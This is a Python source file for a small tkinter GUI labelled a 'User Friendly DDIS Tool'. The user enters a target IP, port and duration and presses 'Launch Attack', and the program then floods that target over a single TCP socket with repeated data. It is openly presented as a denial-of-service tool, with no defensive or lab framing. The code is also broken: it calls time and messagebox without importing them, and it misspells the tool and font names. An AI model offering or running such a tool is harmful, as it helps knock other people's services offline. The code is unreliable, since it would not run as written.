import tkinter as tk
from tkinter import ttk
import socket
import threading

class DDoSApp:
    def __init__(self, master):
        self.master = master
        master.title("User Friendly DDIS Tool")
        master.geometry("400x200")
        master.configure(bg="#eaeaea")

        self.label_title = ttk.Label(master, text="User Friendly DDIS Tool", font=("Fruitiger", 16), background="#eaeaea")
        self.label_title.grid(row=0, columnspan=2, pady=(10, 20))

        self.label_ip = ttk.Label(master, text="Target IP:", background="#eaeaea")
        self.label_ip.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)

        self.entry_ip = ttk.Entry(master)
        self.entry_ip.grid(row=1, column=1, padx=10, pady=5)
        self.entry_ip.insert(0, "127.0.0.1")  # Default value

        self.label_port = ttk.Label(master, text="Target Port:", background="#eaeaea")
        self.label_port.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)

        self.entry_port = ttk.Entry(master)
        self.entry_port.grid(row=2, column=1, padx=10, pady=5)
        self.entry_port.insert(0, "80")  # Default value

        self.label_duration = ttk.Label(master, text="Duration (seconds):", background="#eaeaea")
        self.label_duration.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)

        self.entry_duration = ttk.Entry(master)
        self.entry_duration.grid(row=3, column=1, padx=10, pady=5)
        self.entry_duration.insert(0, "10")  # Default value

        self.button_start = ttk.Button(master, text="Launch Attack", command=self.start_ddos, style="Cool.TButton")
        self.button_start.grid(row=4, columnspan=2, pady=10)

        # Define custom style for the button
        style = ttk.Style()
        style.configure("Cool.TButton", background="#ff5733", foreground="#ffffff", font=("Fruitiger", 12), padding=10)

    def start_ddos(self):
        target_ip = self.entry_ip.get()
        target_port = int(self.entry_port.get())
        duration = int(self.entry_duration.get())

        # Create a new thread for DDoS attack
        threading.Thread(target=self.ddos, args=(target_ip, target_port, duration)).start()

    def ddos(self, target_ip, target_port, duration):
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to the target
            s.connect((target_ip, target_port))
            
            print(f"DDoS attack started on {target_ip}:{target_port} for {duration} seconds")
            # Send data until duration expires
            start_time = time.time()
            while (time.time() - start_time) < duration:
                s.send(b'Data to flood the target with...')
                
            # Close the socket
            s.close()
            print("DDoS attack finished.")
            messagebox.showinfo("DDoS Attack", "DDoS attack finished.")
        except Exception as e:
            print("Error: ", e)
            messagebox.showerror("Error", f"An error occurred: {e}")

def main():
    root = tk.Tk()
    app = DDoSApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
